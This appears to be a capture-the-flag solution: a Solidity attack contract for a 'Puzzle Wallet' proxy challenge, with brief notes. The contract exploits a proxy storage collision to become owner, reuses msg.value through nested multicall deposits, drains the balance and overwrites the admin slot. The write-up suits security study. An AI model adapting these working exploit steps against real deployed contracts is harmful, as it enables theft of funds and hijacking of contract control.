```javascript
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

contract PuzzleWalletAttack {
    constructor () public payable {
    }

    function setOwner(address addr) public {
        (bool success, ) = addr.call(abi.encodeWithSignature("proposeNewAdmin(address)", address(this)));
        require(success, "failed to propose new admin.");
    }

    function attack(address addr) public{
        (bool success2, ) = addr.call(abi.encodeWithSignature("addToWhitelist(address)", address(this)));
        require(success2, "failed to add to whitelist.");
        bytes[] memory data = new bytes[](1);
        data[0] = (abi.encodeWithSignature("deposit()"));
        bytes memory multicall_sig = abi.encodeWithSignature("multicall(bytes[])", data);
        bytes[] memory multicall_data = new bytes[](2);
        multicall_data[0] = multicall_sig;
        multicall_data[1] = multicall_sig;
        uint256 balance_to_deposit = 1000000000000000;
        (bool success3, ) = addr.call{value : balance_to_deposit}(abi.encodeWithSignature("multicall(bytes[])", multicall_data));
        require(success3, "failed to multicall deposit.");
        bytes memory empty;
        uint256 balance_to_extract = 2000000000000000;
        (bool success4, ) = addr.call(abi.encodeWithSignature("execute(address,uint256,bytes)", tx.origin, balance_to_extract, empty));
        require(success4, "failed to drain deposit.");
        (bool success5, ) = addr.call(abi.encodeWithSignature("setMaxBalance(uint256)", uint256(tx.origin)));
        require(success5, "failed to set admin.");
    }
}
```

We need `ABIEncodeV2` because we are using nested array type.

First, call `setOwner` to update the owner variable to our address. This is possible due to storage collision, since everthing will be delegatecall-ed to the implementation contract, we have to make sure the storage of the proxy and the wallet is aligned.

The second step is to explioit the multicall function to recursively call `deposit` and thus reusing the `msg.value`.